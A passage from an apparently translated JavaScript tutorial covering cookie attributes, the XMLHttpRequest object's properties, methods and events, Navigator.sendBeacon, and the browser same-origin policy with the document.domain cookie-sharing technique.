In the code above, when writing the cookie, the `expires` attribute is also set. There can be no spaces on either side of the equals sign in the attribute value either.

The notes for writing each attribute are as follows.

- The `path` attribute must be an absolute path, and defaults to the current path.
- The `domain` attribute value must be part of the domain that currently sends the cookie. For example, if the current domain is `example.com`, you cannot set it to `foo.com`. This attribute defaults to the current first-level domain (excluding second-level domains).
- The value of the `max-age` attribute is in seconds.
- The value of the `expires` attribute is in UTC format, and you can use `Date.prototype.toUTCString()` for date format conversion.

**An example of writing a cookie with `document.cookie` is as follows**.

```js
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
```

Once a cookie's attributes have been set, there is no way to read the values of these attributes.

**The only way to delete an existing cookie is to set its `expires` attribute to a past date.**

```js
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
```

In the code above, the cookie named `fontSize` has an empty value and an expiration time set to midnight on January 1, 1970, which is equivalent to deleting this cookie.



## 5. The XMLHttpRequest Object

### 1. Introduction

The browser and server communicate using the HTTP protocol. When the user types a URL into the browser's address bar, or submits content to the server via a web form, the browser sends an HTTP request to the server.

In 1999, Microsoft released IE browser version 5.0, which for the first time introduced a new feature: allowing JavaScript scripts to initiate HTTP requests to the server. This feature did not attract attention at the time, until the release of Gmail in 2004 and Google Maps in 2005, when it gained widespread attention. In February 2005, the term AJAX was formally proposed for the first time; it is an abbreviation for Asynchronous JavaScript and XML, and refers to using JavaScript's asynchronous communication to obtain an XML document from the server, extract data from it, and then update the corresponding part of the current page without refreshing the entire page. Later, the term AJAX became synonymous with JavaScript scripts initiating HTTP communication, that is, **as long as you initiate communication with a script, it can be called AJAX communication**. The W3C also released its international standard in 2006.

Specifically, AJAX includes the following steps.

1. Create an XMLHttpRequest instance
2. Send an HTTP request
3. Receive the data returned by the server
4. Update the page data

To summarize in one sentence, AJAX sends an HTTP request through the native `XMLHttpRequest` object, and after obtaining the data returned by the server, processes it. Nowadays, the server returns data in JSON format, and the XML format is outdated, but the name AJAX has become a generic term, and its literal meaning has disappeared.

The `XMLHttpRequest` object is the main interface of AJAX, used for communication between the browser and the server. Although its name contains `XML` and `Http`, it can actually use multiple protocols (such as `file` or `ftp`) and send data in any format (including strings and binary).

`XMLHttpRequest` is itself a constructor, and you can use the `new` command to generate an instance. It takes no arguments.

```js
var xhr = new XMLHttpRequest(); // create a request instance
```

Once a new instance is created, you can use the `open()` method to specify some details for establishing the HTTP connection.

```js
xhr.open('GET', 'http://www.example.com/page.php', true); // request method, address, whether asynchronous
```

The code above specifies using the GET method to establish a connection with the specified server URL. The third argument `true` indicates that the request is asynchronous.

Then, specify a callback function to listen for changes in the communication state (the `readyState` property).

```js
xhr.onreadystatechange = handleStateChange; // the callback listens for changes in the request state and runs the listener function

function handleStateChange() {
  // ...
}
```

In the code above, whenever the state of the `XMLHttpRequest` instance changes, the listener function `handleStateChange` is called.

Finally, use the `send()` method to actually send the request.

```js
xhr.send(null); // send the request; null means no data is sent with the request (a POST request would carry data)
```

In the code above, the argument of `send()` is `null`, indicating that no data body is carried when sending the request. If a POST request is sent, the data body needs to be specified here.

Once the data returned by the server is obtained, AJAX does not refresh the entire page but only updates the relevant part of the page, so as not to interrupt what the user is doing.

Note that AJAX can only send HTTP requests to same-origin URLs (with the same protocol, domain, and port); if a cross-origin request is sent, an error is thrown (see the chapters "Same-Origin Policy" and "CORS Communication" for details).

Below is a complete **example** of the basic usage of the `XMLHttpRequest` object.

```js
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function(){
  if (xhr.readyState === 4){ // when communication succeeds, the state value is 4
    if (xhr.status === 200){ // status code
      console.log(xhr.responseText); // response content
    } else {
      console.error(xhr.statusText);
    }
  }
};

xhr.onerror = function (e) {
  console.error(xhr.statusText);
};

xhr.open('GET', '/endpoint', true);
xhr.send(null);
```



### 2. Instance properties of XMLHttpRequest

#### 2.1 XMLHttpRequest.readyState: the current status code of the instance object

`XMLHttpRequest.readyState` returns an **integer** representing **the current state of the instance object**. This property is **read-only**. It may return the following values.

- 0, indicating that the XMLHttpRequest instance has been created, but the instance's `open()` method has not yet been called. **[instance created, but open() not called]**



- 1, indicating that the `open()` method has been called, but the instance's `send()` method has not yet been called; you can still use the instance's `setRequestHeader()` method to set the HTTP request headers. **[open() called, but send() not called]**



- 2, indicating that the instance's `send()` method has been called, and the headers and status code returned by the server have been received. **[send() called, headers and status code received]**

- 3, indicating that the data body (body part) sent by the server is being received. At this point, if the instance's `responseType` property equals `text` or an empty string, the `responseText` property will contain the partial information already received. **[receiving the data body]**

- 4, indicating that the data returned by the server has been completely received, or this reception has failed. **[reception complete, failed or succeeded]**

During communication, whenever the state of the instance object changes, the value of its `readyState` property changes. Each time this value changes, the `onreadystatechange()` event is triggered.

```js
var xhr = new XMLHttpRequest();

if (xhr.readyState === 4) {
  // request finished, process the data returned by the server
} else {
  // show a "Loading..." prompt
}
```

In the code above, when `xhr.readyState` equals `4`, it indicates that the HTTP request sent by the script has completed. In all other cases, the HTTP request is still in progress.



#### 2.2 XMLHttpRequest.onreadystatechange: listening for state changes

The `XMLHttpRequest.onreadystatechange` property **points to a listener function**. When the `readystatechange` event occurs (the instance's `readyState` property changes), this property is executed.

In addition, if you use the instance's `abort()` method to terminate the XMLHttpRequest request, this also causes the `readyState` property to change, leading to the `XMLHttpRequest.onreadystatechange` property being called.

Below is an example.

```js
var xhr = new XMLHttpRequest();
xhr.open( 'GET', 'http://example.com' , true );
xhr.onreadystatechange = function () {
  if (xhr.readyState !== 4 || xhr.status !== 200) {
    return;
  }
  console.log(xhr.responseText);
};
xhr.send();
```



#### 2.3 XMLHttpRequest.response: the response data body

The `XMLHttpRequest.response` property represents **the data body returned by the server (that is, the body part of the HTTP response)**. It may be any data type, such as a string, object, binary object, etc.; **the specific type is determined by the `XMLHttpRequest.responseType` property. This property is read-only.**

If this request did not succeed or the data is incomplete, this property equals `null`. However, if the `responseType` property equals `text` or an empty string, then before the request finishes (the stage where `readyState` equals 3), the `response` property contains the partial data the server has already returned.

```js
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    handler(xhr.response);
  }
}
```



#### 2.4 XMLHttpRequest.responseType: the response data type

The `XMLHttpRequest.responseType` property is a **string** representing **the type of data returned by the server**. This property is **writable**; you can set its value after calling the `open()` method and before calling the `send()` method, to tell the server to return data of the specified type. If `responseType` is set to an empty string, it is equivalent to the default value `text`.

The `XMLHttpRequest.responseType` property can equal the following values.

- "" (empty string): equivalent to `text`, indicating that the server returns **text string data**.
- "arraybuffer": an ArrayBuffer object, indicating that the server returns a **binary array**.
- "blob": a Blob object, indicating that the server returns a **binary object**.
- "document": a Document object, indicating that the server returns a **document object**.
- "json": a **JSON object**.
- "text": a **string**.

Among these types, the `text` type is suitable for most cases, and directly handling text is also relatively convenient. The `document` type is suitable when an HTML/XML document is returned, which means that for sites with CORS enabled, you can directly use AJAX to fetch the page, and then, without parsing the HTML string, directly perform DOM operations on the fetched data. The `blob` type is suitable for reading binary data, such as image files.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/image.png', true);
xhr.responseType = 'blob';

xhr.onload = function(e) {
  if (this.status === 200) {
    var blob = new Blob([xhr.response], {type: 'image/png'});
    // or
    var blob = xhr.response;
  }
};

xhr.send();
```

If you set this property to `ArrayBuffer`, you can process binary data as an array.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/image.png', true);
xhr.responseType = 'arraybuffer';

xhr.onload = function(e) {
  var uInt8Array = new Uint8Array(this.response);
  for (var i = 0, len = uInt8Array.length; i < len; ++i) {
    // var byte = uInt8Array[i];
  }
};

xhr.send();
```

**If you set this property to `json`, the browser will automatically call the `JSON.parse()` method on the returned data**. In other words, what you get from the `xhr.response` property (note, not the `xhr.responseText` property) is not text but a JSON object.



#### 2.5 XMLHttpRequest.responseText: the response text

The `XMLHttpRequest.responseText` property **returns the string received from the server**; this property is **read-only**. Only after the HTTP request has finished being received will this property contain the complete data.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/server', true);

xhr.responseType = 'text';
xhr.onload = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseText);
  }
};

xhr.send(null);
```



#### 2.6 XMLHttpRequest.responseXML: the response HTML or XML document

The `XMLHttpRequest.responseXML` property returns **the HTML or XML document object received from the server**; this property is **read-only**. If this request did not succeed, or the received data cannot be parsed as XML or HTML, this property equals `null`.

The precondition for this property to take effect is that the HTTP response's `Content-Type` header equals `text/xml` or `application/xml`. This **requires that, before sending the request, the `XMLHttpRequest.responseType` property be set to `document`**. If the HTTP response's `Content-Type` header is not equal to `text/xml` or `application/xml`, but you want to obtain data from `responseXML` (that is, parse the data in DOM format), then you need to **manually call the `XMLHttpRequest.overrideMimeType()` method to force XML parsing**.

The data obtained by this property is the directly parsed document DOM tree.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/server', true);

xhr.responseType = 'document';
xhr.overrideMimeType('text/xml');

xhr.onload = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseXML);
  }
};

xhr.send(null);
```



#### 2.7 XMLHttpRequest.responseURL: the URL of the server that sent the data

The `XMLHttpRequest.responseURL` property is a string representing **the URL of the server that sent the data**.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://example.com/test', true);
xhr.onload = function () {
  // returns http://example.com/test
  console.log(xhr.responseURL);
};
xhr.send(null);
```

**Note that the value of this property is not necessarily the same as the request URL specified by the `open()` method**. If a redirect occurs on the server side, this property returns the URL of the location that actually returned the data last. In addition, if the original URL includes a fragment, this property strips the fragment.



#### 2.8 XMLHttpRequest.status: the status code; XMLHttpRequest.statusText: the status message string

The `XMLHttpRequest.status` property returns an integer representing **the HTTP status code of the server's response**. Generally speaking, if communication succeeds, this status code is 200; if the server does not return a status code, then this property defaults to 200. Before the request is sent, this property is `0`. This property is read-only.

- **200, OK, normal access**
- 301, Moved Permanently
- 302, Moved temporarily
- **304**, Not Modified
- 307, Temporary Redirect
- 401, Unauthorized
- 403, Forbidden
- **404**, Not Found, **the specified URL was not found**
- **500**, Internal Server Error, **an error occurred on the server**

Basically, only the 2xx and 304 status codes indicate that the server's response is in a normal state.

```js
if (xhr.readyState === 4) {
  if ( (xhr.status >= 200 && xhr.status < 300)
    || (xhr.status === 304) ) {
    // process the data returned by the server
  } else {
    // error
  }
}
```

The `XMLHttpRequest.statusText` property returns a **string** representing **the status message sent by the server**. Unlike the `status` property, this property **contains the entire status message, such as "OK" and "Not Found"**. Before the request is sent (that is, before the `open()` method is called), the value of this property is an empty string; if the server does not return a status message, the value of this property defaults to "OK". This property is read-only.

#### 2.9 XMLHttpRequest.timeout: the timeout (in milliseconds); XMLHttpRequestEventTarget.ontimeout: the timeout function

The `XMLHttpRequest.timeout` property returns an integer representing the number of milliseconds after which, if the request still has not gotten a result, it is automatically terminated. If this property equals 0, it means there is no time limit.

The `XMLHttpRequestEventTarget.ontimeout` property is used to set a listener function that executes if the timeout event occurs.

Below is an example.

```js
var xhr = new XMLHttpRequest();
var url = '/server';

xhr.ontimeout = function () {
  console.error('The request for ' + url + ' timed out.');
};

xhr.onload = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      // process the data returned by the server
    } else {
      console.error(xhr.statusText);
    }
  }
};

xhr.open('GET', url, true);
// specify a 10-second timeout
xhr.timeout = 10 * 1000;
xhr.send(null);
```



#### 2.10 Event listener properties

The XMLHttpRequest object can specify listener functions for the following events.

- XMLHttpRequest.onloadstart: the listener function for the loadstart event (the HTTP request is sent) **[request started]**
- XMLHttpRequest.onprogress: the listener function for the progress event (data is being sent and loaded) **[in progress, progress]**
- XMLHttpRequest.onabort: the listener function for the abort event (the request is aborted, for example the user called the `abort()` method) **[request aborted]**
- XMLHttpRequest.onerror: the listener function for the error event (the request failed) **[request failed]**
- XMLHttpRequest.onload: the listener function for the load event (the request completed successfully) **[request succeeded]**
- XMLHttpRequest.ontimeout: the listener function for the timeout event (the time limit specified by the user was exceeded and the request has not yet completed) **[request timed out]**
- XMLHttpRequest.onloadend: the listener function for the loadend event (the request completed, whether successfully or not) **[request completed, regardless of success or failure]**

Below is an example.

```js
xhr.onload = function() { // request succeeded
 var responseText = xhr.responseText;
 console.log(responseText);
 // process the response.
};

xhr.onabort = function () { // request aborted
  console.log('The request was aborted');
};

xhr.onprogress = function (event) { // in progress
  console.log(event.loaded); // amount of data transferred
  console.log(event.total); // total amount of data
  console.log(event.lengthComputable) / whether the load progress can be computed
};

xhr.onerror = function() { // request failed
  console.log('There was an error!');
};
```

The listener function for the `progress` event has an event object argument with three properties: the `loaded` property returns **the amount of data already transferred**, the `total` property returns **the total amount of data**, and the `lengthComputable` property returns a boolean value indicating **whether the load progress can be computed**. Among all these listener functions, only the `progress` event's listener function has an argument; the other functions have no arguments.

Note that if a network error occurs (for example, the server cannot be reached), the `onerror` event cannot obtain the error information. In other words, there may be no error object, so this can only display an error prompt.



#### 2.11 XMLHttpRequest.withCredentials: whether user information is included in cross-origin requests

The `XMLHttpRequest.withCredentials` property is a **boolean value** indicating **whether, for cross-origin requests, user information (such as cookies and authentication HTTP headers) is included in the request**, defaulting to `false`, that is, when making a cross-origin request to `example.com`, the cookies that `example.com` set on the local machine (if any) are not sent.

If a cross-origin AJAX request needs to send cookies, the `withCredentials` property needs to be set to `true`. Note that same-origin requests do not need to set this property.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

**For this property to take effect, the server must explicitly return the `Access-Control-Allow-Credentials` header.**

```js
Access-Control-Allow-Credentials: true
```

If the `withCredentials` property is enabled, a cross-origin request not only sends cookies but also sets the cookies specified by the remote host. The converse is also true: if the `withCredentials` property is not enabled, then even if a cross-origin AJAX request explicitly asks the browser to set cookies, the browser ignores it.

Note that scripts always obey the same-origin policy and cannot read cross-origin cookies from `document.cookie` or from HTTP response headers; the `withCredentials` property does not affect this.



#### 2.12 XMLHttpRequest.upload: the file upload object

XMLHttpRequest can not only send requests but **can also send files; this is AJAX file uploading**. After sending a file, you can obtain an **object** through the `XMLHttpRequest.upload` property, and by observing this object, you can learn about the upload progress. The main approach is to listen to the various events of this object: loadstart, loadend, load, abort, error, progress, timeout. (prefix with `on` when using)

Assume there is a `<progress>` element on the page.

```html
<progress min="0" max="100" value="0">0% complete</progress>
```

During file upload, by specifying a listener function for the `progress` event on the `upload` property, you can obtain the upload progress.

```js
function upload(blobOrFile) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/server', true);
  xhr.onload = function (e) {};

  var progressBar = document.querySelector('progress');
  xhr.upload.onprogress = function (e) {
    if (e.lengthComputable) {
      progressBar.value = (e.loaded / e.total) * 100;
      // for compatibility with older browsers that do not support the <progress> element
      progressBar.textContent = progressBar.value;
    }
  };

  xhr.send(blobOrFile);
}

upload(new Blob(['hello world'], {type: 'text/plain'}));
```



### 3. Instance methods of XMLHttpRequest

#### 3.1 XMLHttpRequest.open(): specify the request parameters

The `XMLHttpRequest.open()` method is **used to specify the parameters of an HTTP request**, or in other words to initialize the XMLHttpRequest instance object. It can accept a total of **five arguments**.

```js
void open(
   string method, // string, the request method GET, POST, PUT, DELETE, HEAD, etc.
   string url,// string, the request URL
   optional boolean async, // optional, boolean, whether asynchronous, defaults to true
   optional string user,// optional, string, the authentication username
   optional string password// optional, string, the authentication password
);
```

- `method`: indicates the HTTP verb method, such as `GET`, `POST`, `PUT`, `DELETE`, `HEAD`, etc.
- `url`: indicates the target URL to which the request is sent.
- `async`: a boolean value indicating whether the request is asynchronous, defaulting to `true`. If set to `false`, then the `send()` method only proceeds to the next operation after receiving the result returned by the server. This argument is optional. Since synchronous AJAX requests cause the browser to become unresponsive, many browsers have already forbidden their use on the main thread, allowing them only inside Workers. Therefore, this argument should not lightly be set to `false`.
- `user`: indicates the username used for authentication, defaulting to an empty string. This argument is optional.
- `password`: indicates the password used for authentication, defaulting to an empty string. This argument is optional.

Note that if you use this method again on an AJAX request that has already used the `open()` method, it is equivalent to calling `abort()`, that is, terminating the request.

Below is an example of sending a POST request.

```js
var xhr = new XMLHttpRequest();
xhr.open('POST', encodeURI('someURL'));
```



#### 3.2 XMLHttpRequest.send(): send the request

The `XMLHttpRequest.send()` method is **used to actually send the HTTP request**. Its argument is optional; if no argument is given, it means the HTTP request has only a URL and no data body, the typical example being a GET request; if an argument is given, it means that in addition to the headers, there is also a message body containing the actual data, the typical example being a POST request.

Below is an example of a GET request.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET',
  'http://www.example.com/?id=' + encodeURIComponent(id),
  true
);
xhr.send(null);
```

In the code above, the parameters of the `GET` request are appended after the URL as a query string.

Below is an example of sending a POST request.

```js
var xhr = new XMLHttpRequest();
var data = 'email='
  + encodeURIComponent(email)
  + '&password='
  + encodeURIComponent(password);

xhr.open('POST', 'http://www.example.com', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(data);
```

Note that all XMLHttpRequest listener events must be set before the `send()` method is called.

The argument of the `send` method is the data to be sent. **Data of various formats can serve as its argument**.

```js
void send();
void send(ArrayBufferView data); // binary array
void send(Blob data); // binary large object
void send(Document data); // document object
void send(String data); // string data
void send(FormData data); // form data?
```

If `send()` sends a DOM object, the data is first serialized before being sent. **If you send binary data, it is best to send an `ArrayBufferView` or `Blob` object, which makes uploading files via AJAX possible.**

Below is an example of sending form data. The `FormData` object can be used to construct form data.

```js
var formData = new FormData();

formData.append('username', 'John Smith');
formData.append('email', 'johnsmith@example.com');
formData.append('birthDate', 1940);

var xhr = new XMLHttpRequest();
xhr.open('POST', '/register');
xhr.send(formData);
```

In the code above, the `FormData` object constructs the form data, and then the `send()` method is used to send it. Its effect is the same as sending the following form data.

```html
<form id='registration' name='registration' action='/register'>
  <input type='text' name='username' value='John Smith'>
  <input type='email' name='email' value='johnsmith@example.com'>
  <input type='number' name='birthDate' value='1940'>
  <input type='submit' onclick='return sendForm(this.form);'>
</form>
```

The example below uses the `FormData` object to process form data and then send it.

```js
function sendForm(form) {
  var formData = new FormData(form);
  formData.append('csrf', 'e69a18d7db1286040586e6da1950128c');

  var xhr = new XMLHttpRequest();
  xhr.open('POST', form.action, true);
  xhr.onload = function() {
    // ...
  };
  xhr.send(formData);

  return false;
}

var form = document.querySelector('#registration');
sendForm(form);
```



#### 3.3 XMLHttpRequest.setRequestHeader(): set request headers

The `XMLHttpRequest.setRequestHeader()` method is used to **set the headers of the HTTP request sent by the browser**. This method must be called **after `open()` and before `send()`**. If this method is called multiple times to set the same field, then the values of each call are merged into a single value and sent.

This method accepts two arguments. The first argument is a string representing the field name of the header, and the second argument is the field value.

```js
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
xhr.send(JSON.stringify(data));
```

The code above first sets the `Content-Type` header, indicating that JSON-format data is being sent; then sets `Content-Length`, indicating the data length; and finally sends the JSON data.



#### 3.4 XMLHttpRequest.overrideMimeType(): override the returned MIME type

The `XMLHttpRequest.overrideMimeType()` method is **used to specify a MIME type that overrides the actual MIME type returned by the server**, thereby causing the browser to process it differently. For example, suppose the data type returned by the server is `text/xml`, and for various reasons the browser fails to parse it and throws an error, in which case you cannot get the data. To get the raw data, we can change the MIME type to `text/plain` (plain text), so that the browser does not parse it automatically, and thus we can get the raw text.

```js
xhr.overrideMimeType('text/plain')
```

**Note that this method must be called before the `send()` method.**

Modifying the data type returned by the server is not the approach that should normally be taken. If you want the server to return a specified data type, you can use the `responseType` property to tell the server, as in the example below. **Only use the `overrideMimeType()` method when the server cannot return a certain data type.**

```js
var xhr = new XMLHttpRequest();
xhr.onload = function(e) {
  var arraybuffer = xhr.response;
  // ...
}
xhr.open('GET', url);
xhr.responseType = 'arraybuffer';
xhr.send();
```



#### 3.5 XMLHttpRequest.getResponseHeader(): get the value of a specified response header field

The `XMLHttpRequest.getResponseHeader()` method **returns the value of a specified field of the HTTP headers,** or returns `null` if the server response has not yet been received or the specified field does not exist. The argument of this method is case-insensitive.

```js
function getHeaderTime() {
  console.log(this.getResponseHeader("Last-Modified"));
}

var xhr = new XMLHttpRequest();
xhr.open('HEAD', 'yourpage.html');
xhr.onload = getHeaderTime;
xhr.send();
```

If there are multiple fields with the same name, their values are joined into a single string, with each field separated by "comma + space".



#### 3.6 XMLHttpRequest.getAllResponseHeaders(): get all headers

The `XMLHttpRequest.getAllResponseHeaders()` method returns a **string** representing **all HTTP headers** sent by the server. The format is a string, with each header separated by `CRLF` (carriage return + line feed); if no server response has been received, this property is `null`. If a network error occurs, this property is an empty string.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'foo.txt', true);
xhr.send();

xhr.onreadystatechange = function () {
  if (this.readyState === 4) {
    var headers = xhr.getAllResponseHeaders();
  }
}
```

The code above is used to obtain all the headers returned by the server. It might be a string like the following.

```js
date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
content-encoding: gzip\r\n
x-content-type-options: nosniff\r\n
server: meinheld/0.6.1\r\n
x-frame-options: DENY\r\n
content-type: text/html; charset=utf-8\r\n
connection: keep-alive\r\n
strict-transport-security: max-age=63072000\r\n
vary: Cookie, Accept-Encoding\r\n
content-length: 6502\r\n
x-xss-protection: 1; mode=block\r\n
```

Then, process this string.

```js
var arr = headers.trim().split(/[\r\n]+/);
var headerMap = {};

arr.forEach(function (line) {
  var parts = line.split(': ');
  var header = parts.shift();
  var value = parts.join(': ');
  headerMap[header] = value;
});

headerMap['content-length'] // "6502"
```



#### 3.7 XMLHttpRequest.abort(): terminate the request

The `XMLHttpRequest.abort()` method is used to **terminate an HTTP request that has already been sent**. After calling this method, the `readyState` property becomes `4` and the `status` property becomes `0`.

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://www.example.com/page.php', true);
setTimeout(function () {
  if (xhr) {
    xhr.abort();
    xhr = null;
  }
}, 5000);
```

The code above terminates an AJAX request 5 seconds after it is sent.



### 4. Events of XMLHttpRequest instances

#### 4.1 The readyStateChange event (state change event)

When the value of the `readyState` property changes, the readyStateChange event is triggered.

We can use the `onReadyStateChange` property to specify the listener function for this event, handling different states differently. In particular, when the state becomes `4`, indicating that communication succeeded, the callback function can process the data sent back by the server.



#### 4.2 The progress event (in-progress, progress event)

When uploading a file, both the XMLHttpRequest instance object itself and the instance's `upload` property have a `progress` event that continuously returns the upload progress.

```js
var xhr = new XMLHttpRequest();

function updateProgress (oEvent) {
  if (oEvent.lengthComputable) {
    var percentComplete = oEvent.loaded / oEvent.total;
  } else {
    console.log('Unable to compute progress');
  }
}

xhr.addEventListener('progress', updateProgress);

xhr.open();
```



#### 4.3 The load event, error event, abort event (request completed, request error, request aborted)

The load event indicates that the data sent by the server has been fully received, the error event indicates that the request errored, and the abort event indicates that the request was interrupted (for example, the user canceled the request).

```js
var xhr = new XMLHttpRequest();

xhr.addEventListener('load', transferComplete);
xhr.addEventListener('error', transferFailed);
xhr.addEventListener('abort', transferCanceled);

xhr.open();

function transferComplete() {
  console.log('Data reception complete');
}

function transferFailed() {
  console.log('An error occurred while receiving data');
}

function transferCanceled() {
  console.log('The user canceled reception');
}
```



#### 4.4 The loadend event (request ended, regardless of success)

The three events `abort`, `load`, and `error` are each accompanied by a `loadend` event, which indicates that the request has ended, but does not indicate whether it succeeded.

```js
xhr.addEventListener('loadend', loadEnd);

function loadEnd(e) {
  console.log('Request ended, status unknown');
}
```



#### 4.5 The timeout event (request timeout)

If the server has not returned a result after the specified time, the timeout event is triggered; for a concrete example, see the section on the `timeout` property.



### 5. Navigator.sendBeacon(): sending data when unloading the page

When the user unloads the page, sometimes some data needs to be sent to the server. The natural approach is to use the `XMLHttpRequest` object to send data inside the listener function of the `unload` event or the `beforeunload` event. However, this is not very reliable, because the `XMLHttpRequest` object sends asynchronously, and it is very likely that just as it is about to send, the page has already unloaded, causing the send to be canceled or to fail.

The solution is to add some very time-consuming synchronous operations inside the `unload` event. This leaves enough time to ensure that the asynchronous AJAX can be sent successfully.

```js
function log() {
  let xhr = new XMLHttpRequest();
  xhr.open('post', '/log', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('foo=bar');
}

window.addEventListener('unload', function(event) {
  log();

  // a time-consuming operation
  for (let i = 1; i < 10000; i++) {
    for (let m = 1; m < 10000; m++) { continue; }
  }
});
```

In the code above, a double loop is forcibly executed, prolonging the execution time of the `unload` event so that the asynchronous AJAX can be sent successfully.

Similarly, you can also use `setTimeout`. Below is an example of tracking user clicks.

```js
// HTML code as follows
// <a id="target" href="https://baidu.com">click</a>
const clickTime = 350;
const theLink = document.getElementById('target');

function log() {
  let xhr = new XMLHttpRequest();
  xhr.open('post', '/log', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('foo=bar');
}

theLink.addEventListener('click', function (event) {
  event.preventDefault();
  log();

  setTimeout(function () {
    window.location.href = theLink.getAttribute('href');
  }, clickTime);
});
```

The code above uses `setTimeout` to delay 350 milliseconds before navigating the page, thereby giving the asynchronous AJAX time to be sent.

The common problem with these approaches is that the unload time is forcibly prolonged, the loading of the subsequent page is delayed, and the user experience is poor.

To solve this problem, browsers introduced the `Navigator.sendBeacon()` method. This method still sends the request asynchronously, but the request is decoupled from the current page thread and runs as a task of the browser process, and therefore **it can guarantee that the data will be sent without delaying the unload process**.

```js
window.addEventListener('unload', logData, false);

function logData() {
  navigator.sendBeacon('/log', analyticsData); // first argument: url, second argument: the data to send
}
```

The `Navigator.sendBeacon` method **accepts two arguments**: the first argument is **the URL of the target server**, and the second argument is **the data to send** (optional), which can be any type (string, form object, binary object, etc.).

```js
navigator.sendBeacon(url, data)  // first argument: url, second argument: the data to send
```

The **return value of this method is a boolean value: `true` if the data was successfully sent, otherwise `false`.**

The HTTP method this method uses to send data is POST, it can be cross-origin, and it is similar to submitting form data. It cannot specify a callback function.

Below is an example.

```js
// HTML code as follows
// <body onload="analytics('start')" onunload="analytics('end')">

function analytics(state) {
  if (!navigator.sendBeacon) return;

  var URL = 'http://example.com/analytics';
  var data = 'state=' + state + '&location=' + window.location;
  navigator.sendBeacon(URL, data);
}
```



## 6. Same-Origin Policy

 **The cornerstone of browser security is the "same-origin policy"** ([same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy)). Many developers know this, but do not understand it comprehensively.

### 1. Overview

#### 1.1 Meaning

In 1995, the same-origin policy was introduced into the browser by Netscape. Currently, all browsers enforce this policy.

Originally, its meaning was that a cookie set by page A cannot be opened by page B, unless these two pages are "same-origin." **The so-called "same-origin" refers to "three things being the same."**

> - The same protocol
> - The same domain
> - The same port

For example, for the URL `http://www.example.com/dir/page.html`, the protocol is `http://`, the domain is `www.example.com`, and the port is `80` (the default port can be omitted). Its same-origin situations are as follows.

- `http://www.example.com/dir2/other.html`: same-origin
- `http://example.com/dir/other.html`: not same-origin (different domain)
- `http://v2.www.example.com/dir/other.html`: not same-origin (different domain)
- `http://www.example.com:81/dir/other.html`: not same-origin (different port)
- `https://www.example.com/dir/page.html`: not same-origin (different protocol)



#### 1.2 Purpose

The purpose of the same-origin policy **is to ensure the security of user information** and prevent malicious sites from stealing data.

Imagine the following situation: site A is a bank, and after the user logs in, site A sets a cookie on the user's machine containing some private information (such as the total deposit amount). After the user leaves site A, they visit site B. If there were no same-origin restriction, site B could read site A's cookie, and the private information would leak. Even more frightening, cookies are often used to store the user's login status; if the user has not logged out, other sites could impersonate the user and do whatever they want. This is because the browser also stipulates that submitting forms is not subject to the same-origin policy restriction.

It can thus be seen that the same-origin policy is necessary; otherwise cookies could be shared, and the internet would have no security to speak of.



#### 1.3 Scope of restrictions

As the internet has developed, the same-origin policy has become increasingly strict. Currently, if something is not same-origin, three behaviors are restricted.

> (1) Cannot read the cookies, LocalStorage, and IndexedDB of a non-same-origin page.
>
> (2) Cannot access the DOM of a non-same-origin page.
>
> (3) Cannot send AJAX requests to a non-same-origin address (it can be sent, but the browser will refuse to accept the response).

In addition, via JavaScript scripts you can obtain the `window` object of other windows. For non-same-origin pages, currently a window is allowed to access nine properties and four methods of another page's `window` object.

- window.closed
- window.frames
- window.length
- window.location
- window.opener
- window.parent
- window.self
- window.top
- window.window
- window.blur()
- window.close()
- window.focus()
- window.postMessage()

Among the nine properties above, only `window.location` is readable and writable; the other eight are all read-only. Moreover, even for the `location` object, in the non-same-origin case, only calling the `location.replace` method and writing the `location.href` property are allowed.

Although these restrictions are necessary, they are sometimes very inconvenient, and reasonable uses are also affected. The following introduces how to work around the above restrictions.



### 2. Cookie

A cookie is a small piece of information that the server writes to the browser, and only same-origin pages can share it. If two pages have the same first-level domain and differ only in their secondary domain, the browser allows sharing cookies by setting `document.domain`.

For example, if page A's URL is `http://w1.example.com/a.html` and page B's URL is `http://w2.example.com/b.html`, then as long as the same `document.domain` is set, the two pages can share cookies. This is because the browser checks for same-origin via the `document.domain` property.

```js
// both pages need to set this
document.domain = 'example.com';
```

Note that both page A and page B need to set the `document.domain` property in order to achieve the same-origin goal. This is because setting `document.domain` also resets the port to `null`, so if only one page's `document.domain` is set, the two URLs will have different ports and still cannot achieve the same-origin goal.

Now, page A sets a cookie via a script.

```js
document.cookie = "test1=hello";
```

Page B can then read this cookie.

```js
var allCookie = document.cookie;
```

Note that this method only applies to cookies and iframe windows; LocalStorage and IndexedDB cannot work around the same-origin policy this way, and instead must use the PostMessage API introduced below.

In addition, the server can also, when setting a cookie, specify the cookie's domain as the first-level domain, such as `.example.com`.

```js
Set-Cookie: key=value; domain=.example.com; path=/
```

This way, second-level domains and third-level domains can read this cookie without doing any configuration.


